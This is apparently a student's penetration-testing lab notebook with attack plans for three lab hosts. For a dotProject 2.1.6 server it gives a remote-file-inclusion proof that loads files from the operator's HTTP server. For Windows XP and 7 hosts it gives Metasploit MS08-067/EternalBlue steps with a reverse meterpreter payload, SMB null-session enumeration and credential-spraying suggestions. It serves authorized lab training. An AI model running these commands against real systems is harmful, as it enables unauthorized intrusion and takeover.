# Work (scratch)

Session transcripts, command snippets, loot exports, and rough notes. Keep **passwords and live tokens out of git**—paste redacted copies here if you need a paper trail.

---

# Plan of attack (A_Rocha IPs)

**Scope:** Lab-authorized targets only — `10.20.160.102`, `10.20.160.101`, `10.20.160.100`.  
**Operator VM:** **KALI6** (see [parent README](../README.md)).  
**Placeholders:** Replace `<KALI_IP>` / `<KALI_LAB_IP>` with your Kali address on the **lab network** (e.g. `ip -br a`), `<RHOST>` with the target below.

Summaries below match the Nessus notes in [../README.md](../README.md#nessus--my-hosts-specs--findings); adjust ports and paths after your own `nmap` / service scan.

---

## `10.20.160.102` — Linux / dotProject 2.1.6 (validated)

| Field | Value |
|-------|--------|
| **Role** | Primary **web** target — **Apache 2.2.21**, **PHP 5.3.8**, **LAMPP** path **`/opt/lampp/htdocs/`** (from PHP notice) |
| **App** | **dotProject 2.1.6** — **`/dotproject/`** (root **302/301** to this path) |
| **Confirmed primitive** | **RFI** — **`/dotproject/modules/projectdesigner/gantt.php`** + **`dPconfig[root_dir]=http://<KALI>:8080/<file>?`** — response body reflected **`RFI_MARKER_EPT`** / **`PROOF`** ([`102-004` evidence](../Screenshots/102-004_rfi_proof_txt_body_PROOF_tm6_afrocha.png)) |

**Lanes that did not pan out:** Shellshock (**MSF `check`** negative), **`msf > search dot`**, **`php_imap_open_rce`**, generic **PHP-CGI** rows, RFI **listener / path** mistakes — full notes and screenshots: **[`unfruitful_attempts/README.md`](unfruitful_attempts/README.md)**.

### Plan of attack — commands (current)

```bash
export RHOST_102=10.20.160.102
echo TM6_afrocha; date
ip -br a    # set LHOST / KALI_LAB_IP to the interface .102 can reach (e.g. 10.20.150.106)
```

**1 — Map services**

```bash
nmap -Pn -sS -sV -T4 "$RHOST_102" -oA ~/scans/nmap_102_initial
nmap -Pn -p 80,443,8080,8443 -sV --script http-enum,http-headers "$RHOST_102"
```

**2 — Web entry + version fingerprint**

```bash
curl -sik "http://$RHOST_102/"
curl -sik "http://$RHOST_102/dotproject/"
curl -sik "http://$RHOST_102/dotproject/index.php"
```

**3 — Optional scanner**

```bash
nikto -h "http://$RHOST_102"
```

**4 — Exploit-DB + RFI proof (lab-authorized)**

```bash
searchsploit dotproject 2.1.6
searchsploit -x php/webapps/<id-for-gantt-RFI>

export LHOST=<KALI_LAB_IP>
mkdir -p ~/rfi_poc
printf 'RFI_MARKER_EPT\n' > ~/rfi_poc/marker.txt
printf 'PROOF\n' > ~/rfi_poc/proof.txt
cd ~/rfi_poc && python3 -m http.server 8080 --bind 0.0.0.0
```

New terminal:

```bash
export RHOST_102=10.20.160.102
export LHOST=<KALI_LAB_IP>

curl -sI "http://$RHOST_102/dotproject/modules/projectdesigner/gantt.php"
curl -s "http://$LHOST:8080/proof.txt"
curl -sik "http://${RHOST_102}/dotproject/modules/projectdesigner/gantt.php?dPconfig%5Broot_dir%5D=http://${LHOST}:8080/proof.txt?"
```

Use **`http://`** to your listener (**not** `https://`). Keep all served files under **`~/rfi_poc/`** (same directory as **`http.server`**).

**5 — Post-ex (after shell or per rubric)**

```bash
hostname; whoami; id
find / -name "local.txt" 2>/dev/null
find / -name "proof.txt" 2>/dev/null
```

### Evidence index (`../Screenshots/`)

| Topic | Files |
|-------|--------|
| nmap / http-enum | `recon_nmap_102_initial_tm6_afrocha.png`, `recon_nmap_102_http_enum_headers_tm6_afrocha.png` |
| curl root / dotproject | `recon_curl_root_302_dotproject_tm6_afrocha.png`, `recon_curl_dotproject_301_tm6_afrocha.png`, `recon_curl_dotproject_https_attempts_tm6_afrocha.png` |
| Version + login | `recon_curl_dotproject_index_php_200_meta_tm6_afrocha.png`, `recon_dotproject_login_html_2_1_6_tm6_afrocha.png` |
| Advisory | `searchsploit_dotproject_2_1_6_rfi_gantt_dPconfig_tm6_afrocha.png` |
| Chronological **102-*** | `102-001_curl_gantt_si_200_tm6_afrocha.png` … `102-004_rfi_proof_txt_body_PROOF_tm6_afrocha.png` (see also `102-002`, `102-003` in repo) |
| Nikto | `recon_nikto_102_http80_banner_redirect_tm6_afrocha.png`, `recon_nikto_102_dotproject_paths_shellshock_tm6_afrocha.png` |
| MSF Shellshock `check` | `exploit_msf_shellshock_printenv_check_not_vuln_tm6_afrocha.png` |
| searchsploit menus | `searchsploit_apache_2_2_21_tm6_afrocha.png`, `searchsploit_php_5_3_8_*.png`, `searchsploit_dotproject_tm6_afrocha.png` |

Screenshot naming **`102-NNN_…`**: [parent README](../README.md) + [`.cursor` rule](../../.cursor/rules/ept-evidence-screenshots.mdc).

---

## `10.20.160.101` — Windows 7 Ultimate

### Specs & exposure (recap)

| Field | Value |
|-------|--------|
| **MAC** | 00:50:56:86:4F:A2 |
| **OS** | Windows 7 Ultimate |
| **Open ports (from host table)** | 135, 139, 445, 49152–49222 range (RPC/SMB stack) |
| **Nessus highlights** | **SSLv2/v3**, **RDP MiTM class** finding, **DROWN**, **Logjam**, **FTP** info, terminal services crypto not FIPS |

### Vulnerabilities (brief)

- **SMB / Windows RPC** — enumerate shares, users, signing; pivot for creds or MS17-010 class checks if applicable to build.
- **RDP (3389 likely)** — password spray / known weak creds in lab; “MiTM” plugin is a hygiene signal, not a remote exploit by itself.
- **FTP** — anonymous or weak creds if enabled.
- **SSL/TLS** — downgrade issues; usually supporting evidence, not primary shell path.

### Plan of attack (commands)

**1 — SMB & MS-RPC fingerprint.**

```bash
export RHOST=10.20.160.101

nmap -Pn -sV -p 135,139,445,21,3389,5985 -sC "$RHOST" -oA ~/scans/nmap_101
nmap -Pn -p445 --script smb-os-discovery,smb-security-mode,smb-enum-shares "$RHOST"
```

**2 — SMB enum (no creds → then with creds).**

```bash
smbclient -L "//${RHOST}" -N
crackmapexec smb "$RHOST" --shares -u '' -p ''
enum4linux -a "$RHOST"
```

**3 — MS17-010 style check (only if SMB says Win7 and lab allows).**

```bash
nmap -Pn -p445 --script smb-vuln-ms17-010 "$RHOST"
# Metasploit:
# use auxiliary/scanner/smb/smb_ms17_010
# set RHOSTS 10.20.160.101; run
```

**4 — RDP if 3389 open.**

```bash
nmap -Pn -p3389 -sV "$RHOST"
# xfreerdp example (after you HAVE creds):
# xfreerdp /v:"$RHOST" /u:<user> /p:<pass> /cert:ignore
```

**5 — FTP if open.**

```bash
nmap -Pn -p21 -sV -sC "$RHOST"
ftp "$RHOST"
# test anonymous: user anonymous, pass test@
```

---

## `10.20.160.100` — Windows XP (EOL)

### Specs & exposure (recap)

| Field | Value |
|-------|--------|
| **OS** | Windows XP SP2/SP3 / embedded variant |
| **Open ports (from host table)** | **139, 445** (SMB), RDP likely given Nessus |
| **Nessus highlights** | **Unsupported XP** (critical), **SMB** issues, **RDP** MiTM class, many **info** SMB/plugin rows |

### Vulnerabilities (brief)

- **EOL OS** — huge unpatched surface; **SMBv1** era bugs (MS08-067, MS17-010) *may* apply depending on service pack and lab image.
- **RDP** — weak creds or known lab passwords.
- **SMB** — null session, share enumeration, pipe abuse per lab tooling.

### Plan of attack (commands)

**1 — Fast SMB + vuln scripts.**

```bash
export RHOST=10.20.160.100

nmap -Pn -sV -p139,445,3389 -sC "$RHOST" -oA ~/scans/nmap_100
nmap -Pn -p445 --script smb-os-discovery,smb-vuln-ms17-010,smb-vuln-ms08-067 "$RHOST"
```

**2 — Enum4linux / smbclient.**

```bash
enum4linux -a "$RHOST"
smbclient -L "//${RHOST}" -N
rpcclient -U "" -N "$RHOST"
```

**3 — Metasploit lanes (pick what matches scan; do not blindly exploit).**

```text
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.20.160.100
run

use exploit/windows/smb/ms08_067_netapi
# OR (if SP/build matches MS17-010 positive check):
# use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.20.160.100
set LHOST <KALI_IP>
set payload windows/meterpreter/reverse_tcp
check
```

**4 — Proof files (same pattern as other hosts).**

```text
meterpreter > getuid
meterpreter > shell
C:\> hostname && whoami
C:\> dir /s /b proof.txt 2>nul & dir /s /b local.txt 2>nul
```

---

## Ordering suggestion (one operator on KALI6)

1. **.102** — **dotProject RFI / web** first (validated path); Shellshock and generic MSF noise archived under [`unfruitful_attempts/`](unfruitful_attempts/README.md).  
2. **.100** — **XP/SMB** classics; do while you have Metasploit workspace warm.  
3. **.101** — **Win7** harder target; use creds or results from **.100** lateral moves if the scenario allows.

Document **what you ran**, **what failed** ([`unfruitful_attempts/README.md`](unfruitful_attempts/README.md)), and **screenshots** under [`../Screenshots/`](../Screenshots/) before promoting to team [`../../1_Screenshots/`](../../1_Screenshots/).
